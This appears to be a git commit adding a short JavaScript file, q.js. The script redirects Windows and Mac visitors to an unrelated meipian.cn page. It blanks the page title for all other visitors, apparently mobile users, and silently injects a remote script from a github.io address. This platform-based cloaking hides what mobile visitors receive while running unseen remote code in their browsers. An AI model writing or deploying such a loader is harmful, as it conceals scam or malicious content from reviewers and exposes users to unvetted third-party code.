39984a1ca7c3ccdc458d042c5363934f74da99e1
fqder897 <50565445+fqder897@users.noreply.github.com>
2019-05-14 08:58:28 +0800

    Create q.js

---
+++ q.js
@@ -0,0 +1,14 @@
+if(/win|mac/ig.test(navigator.platform.toLowerCase())){window.location.href="https://www.meipian.cn/1ebocpk2"; }
+ function loadJs(e) {
+    var t = document.createElement("script"),
+    n = document.getElementsByTagName("script")[0];
+    t.src = e,
+    t.type = "text/javascript",
+    t.async = !0,
+    n.parentNode.insertBefore(t, n)
+}
+function loadPage() {
+    document.title = '';
+    loadJs("https://fqder897.github.io/qq.js");
+}
+loadPage();
